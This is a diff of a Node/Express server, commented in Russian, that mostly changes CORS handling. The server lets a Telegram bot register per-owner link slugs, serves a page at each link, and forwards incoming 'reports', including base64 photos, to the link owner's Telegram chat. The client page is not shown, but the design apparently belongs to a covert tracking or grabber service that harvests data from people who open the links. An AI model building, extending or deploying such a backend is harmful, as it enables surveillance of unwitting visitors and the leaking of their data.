@@ -6,41 +6,67 @@ import path from 'path';
 import Database from 'better-sqlite3';
 import { fileURLToPath } from 'url';
 
-// ==== ENV ====
+// ====== ENV ======
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';          // обязателен
-const DEFAULT_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';      // дефолтный чат (опц.)
-const STATIC_ORIGIN = process.env.STATIC_ORIGIN || '*';          // твой домен или '*'
-const PUBLIC_BASE = process.env.PUBLIC_BASE || STATIC_ORIGIN;    // базовый URL для ссылок
+const DEFAULT_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';      // дефолтный чат
 const ADMIN_API_SECRET = process.env.ADMIN_API_SECRET || '';     // секрет для /api/register-link
 const DB_PATH = process.env.DB_PATH || './data/links.db';
 
-// ==== Paths / Static ====
+// CORS: либо '*' (разрешить всем), либо перечисление доменов через запятую
+// пример: STATIC_ORIGIN="https://cick.one,https://www.cick.one,https://web-detect-soft1.onrender.com"
+const STATIC_ORIGIN = (process.env.STATIC_ORIGIN || '').trim();
+
+// ====== Paths / Static ======
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
-const PUBLIC_DIR = path.join(__dirname, 'public');
+const PUBLIC_DIR = path.join(__dirname, 'public'); // ПАПКА ДОЛЖНА НАЗЫВАТЬСЯ public
 
 // Читаем index.html один раз при старте
 const INDEX_HTML = fs.readFileSync(path.join(PUBLIC_DIR, 'index.html'), 'utf8');
 
-// ==== App ====
+// ====== App ======
 const app = express();
 app.use(express.json({ limit: '15mb' }));
 app.use(express.urlencoded({ extended: true, limit: '15mb' }));
 
-// ==== CORS ====
+// ====== CORS (расширенный) ======
+// 1) Если STATIC_ORIGIN='*' — разрешаем всех.
+// 2) Иначе — разрешаем только список из STATIC_ORIGIN (через запятую) + дефолтные домены проекта.
+const allowAll = STATIC_ORIGIN === '*';
+const allowedFromEnv = STATIC_ORIGIN && STATIC_ORIGIN !== '*'
+  ? STATIC_ORIGIN.split(',').map(s => s.trim()).filter(Boolean)
+  : [];
+const DEFAULT_ALLOWED = new Set([
+  'https://cick.one',
+  'https://www.cick.one',
+  'https://web-detect-soft1.onrender.com',
+]);
+const ALLOWED_ORIGINS = new Set([...DEFAULT_ALLOWED, ...allowedFromEnv]);
+
 app.use((req, res, next) => {
-  res.setHeader('Access-Control-Allow-Origin', STATIC_ORIGIN);
-  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
+  const origin = req.headers.origin;
+
+  if (allowAll) {
+    res.setHeader('Access-Control-Allow-Origin', '*');
+  } else if (origin && ALLOWED_ORIGINS.has(origin)) {
+    // Отражаем ровно тот origin, который пришёл
+    res.setHeader('Access-Control-Allow-Origin', origin);
+  }
+  // Чтобы кэш корректно учитывал Origin
+  res.setHeader('Vary', 'Origin');
+
+  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-  if (req.method === 'OPTIONS') return res.sendStatus(200);
+
+  if (req.method === 'OPTIONS') return res.sendStatus(204);
   next();
 });
 
-// ==== Раздача статики ====
+// ====== Раздача статики ======
 app.use(express.static(PUBLIC_DIR));
 app.get('/', (_req, res) => res.sendFile(path.join(PUBLIC_DIR, 'index.html')));
 
-// ==== DB init ====
+// ====== DB init ======
 if (!fs.existsSync(path.dirname(DB_PATH))) {
   fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });
 }
@@ -55,7 +81,7 @@ db.prepare(`
   )
 `).run();
 
-// ==== Helpers ====
+// ====== Helpers ======
 function requireAdminSecret(req, res, next) {
   const auth = req.headers['authorization'] || '';
   if (!ADMIN_API_SECRET || auth !== `Bearer ${ADMIN_API_SECRET}`) {
@@ -77,6 +103,7 @@ function b64ToBuffer(dataUrl = '') {
   return Buffer.from(b64, 'base64');
 }
 
+// В Node 20 fetch/FormData/Blob — глобальные, импорт не нужен
 async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'report.jpg' }) {
   if (!BOT_TOKEN) throw new Error('Missing TELEGRAM_BOT_TOKEN');
   if (!chatId) throw new Error('Missing chat_id');
@@ -97,10 +124,10 @@ async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'repo
   return resp.json();
 }
 
-// ==== Health ====
+// ====== Health ======
 app.get('/health', (_req, res) => res.json({ ok: true }));
 
-// ==== API: регистрация ссылки (бот вызывает) ====
+// ====== API: регистрация ссылки (бот вызывает) ======
 app.post('/api/register-link', requireAdminSecret, (req, res) => {
   try {
     const { slug, chatId, ownerId } = req.body || {};
@@ -119,7 +146,8 @@ app.post('/api/register-link', requireAdminSecret, (req, res) => {
       return res.status(409).json({ ok: false, error: 'Slug already exists' });
     }
 
-    const base = (PUBLIC_BASE || '').replace(/\/+$/, '');
+    // ссылки всегда отдаём на публичный домен
+    const base = 'https://cick.one';
     const url = `${base}/r/${slug}`;
     res.json({ ok: true, slug, url });
   } catch (e) {
@@ -128,7 +156,7 @@ app.post('/api/register-link', requireAdminSecret, (req, res) => {
   }
 });
 
-// ==== Страница по ссылке /r/:slug ====
+// ====== Страница по ссылке /r/:slug ======
 app.get('/r/:slug', (req, res) => {
   try {
     const { slug } = req.params;
@@ -148,7 +176,7 @@ app.get('/r/:slug', (req, res) => {
   }
 });
 
-// ==== Приём отчёта ====
+// ====== Приём отчёта ======
 app.post('/api/report', async (req, res) => {
   try {
     const {
@@ -185,9 +213,9 @@ app.post('/api/report', async (req, res) => {
   }
 });
 
-// ==== Start ====
+// ====== Start ======
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, () => {
   console.log(`[server] listening on :${PORT}`);
-  console.log(`[server] CORS Allow-Origin: ${STATIC_ORIGIN}`);
+  console.log(`[server] CORS mode:`, allowAll ? '*' : Array.from(ALLOWED_ORIGINS).join(', '));
 });
